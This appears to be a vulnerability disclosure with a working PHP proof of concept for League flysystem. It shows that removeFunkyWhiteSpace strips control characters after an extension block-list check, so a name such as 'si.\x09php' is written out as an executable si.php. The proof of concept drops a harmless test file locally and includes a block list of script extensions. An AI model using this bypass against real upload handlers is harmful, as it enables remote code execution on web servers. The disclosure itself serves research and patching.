@@ -1,0 +1,142 @@
+<?php
+/*
+League flysystem removeFunkyWhiteSpace TOCTOU block extension check Remote Code Execution Vulnerability
+Found by: Steven Seeley of Qihoo 360 Vulcan Team
+
+# Summary:
+
+This vulnerability allows remote attackers to execute arbitrary code on affected installations of League flysystem. Authentication may not be required to exploit this vulnerability. The specific flaw exists within the removeFunkyWhiteSpace function. The issue results from a change in the supplied filename which can introduce a time-of-check time-of-use condition. An attacker can leverage this vulnerability to write arbitrary files on a target web server.
+
+# Vulnerability Analysis:
+
+Inside of the Filesystem class:
+
+```php
+class Filesystem implements FilesystemInterface
+{
+    //...
+
+    public function writeStream($path, $resource, array $config = [])
+    {
+        if ( ! is_resource($resource)) {
+            throw new InvalidArgumentException(__METHOD__ . ' expects argument #2 to be a valid resource.');
+        }
+
+        $path = Util::normalizePath($path); // 1
+        $this->assertAbsent($path);
+        $config = $this->prepareConfig($config);
+
+        Util::rewindStream($resource);
+        return (bool) $this->getAdapter()->writeStream($path, $resource, $config);
+    }
+
+    public function assertAbsent($path)
+    {
+        if ($this->config->get('disable_asserts', false) === false && $this->has($path)) {
+            throw new FileExistsException($path); // whoops
+        }
+    }
+```
+
+At [1] the `normalizePath` method is called:
+
+```php
+class Util
+{
+    //...
+
+    public static function normalizePath($path)
+    {
+        return static::normalizeRelativePath($path); // 2
+    }
+
+    public static function normalizeRelativePath($path)
+    {
+        $path = str_replace('\\', '/', $path);
+        $path = static::removeFunkyWhiteSpace($path); // 3
+
+        $parts = [];
+
+        foreach (explode('/', $path) as $part) {
+            switch ($part) {
+                case '':
+                case '.':
+                break;
+
+            case '..':
+                if (empty($parts)) {
+                    throw new LogicException(
+                        'Path is outside of the defined root, path: [' . $path . ']'
+                    );
+                }
+                array_pop($parts);
+                break;
+
+            default:
+                $parts[] = $part;
+                break;
+            }
+        }
+
+        return implode('/', $parts);
+    }
+```
+
+The code calls `normalizeRelativePath` with the attackers supplied filename at [2] and then calls the `removeFunkyWhiteSpace` function at [3]. Let's investigate this function defined in the same class:
+
+```php
+    protected static function removeFunkyWhiteSpace($path) {
+        // We do this check in a loop, since removing invalid unicode characters
+        // can lead to new characters being created.
+        while (preg_match('#\p{C}+|^\./#u', $path)) {
+            $path = preg_replace('#\p{C}+|^\./#u', '', $path);
+        }
+
+        return $path;
+    }
+```
+
+In summary the code is stripping the filename of any non-printable characters which can be used to bypass block list checks. But definitely props for the .. check ;-)
+
+# Bonus:
+
+The `assertAbsent` call will throw a `FileExistsException` which leaks the full path of the web root to an attacker if the same file is uploaded. You probably want to fix that information disclosure bug too.
+
+# Example:
+
+researcher@neophyte:~$ php poc.php
+(+) vuln
+*/
+
+require __DIR__.'/vendor/autoload.php';
+if (file_exists("output/si.php")) unlink("output/si.php");
+
+$blocklist = [
+        'php',
+        'php3',
+        'php4',
+        'php5',
+        'phtml',
+        'cgi',
+        'pl',
+        'sh',
+        'com',
+        'bat',
+        '',
+        'py',
+        'rb',
+];
+
+// this would be the attack coming from over the web
+$filename = "si.\x09php";
+$d = pathinfo($filename);
+if (in_array($d["extension"], $blocklist, true)) die("(-) blocked, nice try attacker!\r\n");
+$adapter = new League\Flysystem\Local\LocalFilesystemAdapter(__DIR__.'/output');
+$filesystem = new League\Flysystem\Filesystem($adapter);
+$str = "<?php die('pwned');";
+$stream = fopen('data://text/plain,' . $str,'r');
+
+// writes si.php to the output directory which shouldn't happen...
+$filesystem->writeStream($filename, $stream);
+echo file_exists("output/si.php") == true ? "(+) vuln\r\n" : "(+) not vuln\r\n";
+?>
